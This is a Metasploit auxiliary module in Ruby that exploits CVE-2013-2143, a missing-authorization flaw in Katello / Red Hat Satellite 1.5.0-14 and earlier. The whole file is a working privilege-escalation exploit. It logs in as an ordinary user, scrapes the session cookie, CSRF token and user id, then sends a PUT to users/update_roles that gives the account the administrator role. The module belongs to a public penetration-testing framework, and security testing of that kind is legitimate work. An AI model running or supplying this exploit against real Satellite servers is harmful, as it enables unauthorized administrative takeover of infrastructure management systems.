# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      &#039;Name&#039;           => &#039;Katello (Red Hat Satellite) users/update_roles Missing Authorization&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a missing authorization vulnerability in the
        "update_roles" action of "users" controller of Katello and Red Hat Satellite
        (Katello 1.5.0-14 and earlier) by changing the specified account to an
        administrator account.
      },
      &#039;Author&#039;         => &#039;Ramon de C Valle&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-2143&#039;],
          [&#039;CWE&#039;, &#039;862&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 24 2014&#039;
    )

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;Your username&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;Your password&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to the application&#039;, &#039;/&#039;]),
      ], self.class
    )
  end

  def run
    print_status("Logging into #{target_url}...")
    res = send_request_cgi(
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;user_session&#039;, &#039;new&#039;),
      &#039;vars_get&#039; => {
        &#039;username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
      }
    )

    if res.nil?
      print_error(&#039;No response from remote host&#039;)
      return
    end

    if res.headers[&#039;Location&#039;] =~ /user_session\/new$/
      print_error(&#039;Authentication failed&#039;)
      return
    else
      session = $1 if res.get_cookies =~ /_katello_session=(\S*);/

      if session.nil?
        print_error(&#039;Failed to retrieve the current session&#039;)
        return
      end
    end

    print_status(&#039;Retrieving the CSRF token for this session...&#039;)
    res = send_request_cgi(
      &#039;cookie&#039; => "_katello_session=#{session}",
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;dashboard&#039;)
    )

    if res.nil?
      print_error(&#039;No response from remote host&#039;)
      return
    end

    if res.headers[&#039;Location&#039;] =~ /user_session\/new$/
      print_error(&#039;Authentication failed&#039;)
      return
    else
      session = $1 if res.get_cookies =~ /_katello_session=(\S*);/

      if session.nil?
        print_error(&#039;Failed to retrieve the current session&#039;)
        return
      end
    end

    if res.headers[&#039;Location&#039;] =~ /user_session\/new$/
      print_error(&#039;Failed to retrieve the user id&#039;)
      return
    else
      csrf_token = $1 if res.body =~ /<meta[ ]+content="(\S*)"[ ]+name="csrf-token"[ ]*\/?>/i
      csrf_token = $1 if res.body =~ /<meta[ ]+name="csrf-token"[ ]+content="(\S*)"[ ]*\/?>/i if csrf_token.nil?

      if csrf_token.nil?
        print_error(&#039;Failed to retrieve the CSRF token&#039;)
        return
      end

      user = $1 if res.body =~ /\/users.(\d+)#list_search=#{datastore[&#039;USERNAME&#039;]}/

      if user.nil?
        print_error(&#039;Failed to retrieve the user id&#039;)
        return
      end
    end

    print_status("Sending update-user request to #{target_url(&#039;users&#039;, user, &#039;update_roles&#039;)}...")
    res = send_request_cgi(
      &#039;cookie&#039;    => "_katello_session=#{session}",
      &#039;headers&#039;   => {
        &#039;X-CSRF-Token&#039;     => csrf_token
      },
      &#039;method&#039;    => &#039;PUT&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;users&#039;, user, &#039;update_roles&#039;),
      &#039;vars_post&#039; => {
        &#039;user[role_ids][]&#039; => &#039;1&#039;
      }
    )

    if res.nil?
      print_error(&#039;No response from remote host&#039;)
      return
    end

    if res.headers[&#039;X-Message-Type&#039;] =~ /success$/
      print_good(&#039;User updated successfully&#039;)
    else
      print_error(&#039;Failed to update user&#039;)
    end
  end

  def target_url(*args)
    (ssl ? &#039;https&#039; : &#039;http&#039;) +
      if rport.to_i == 80 || rport.to_i == 443
        "://#{vhost}"
      else
        "://#{vhost}:#{rport}"
      end + normalize_uri(target_uri.path, *args)
  end
end

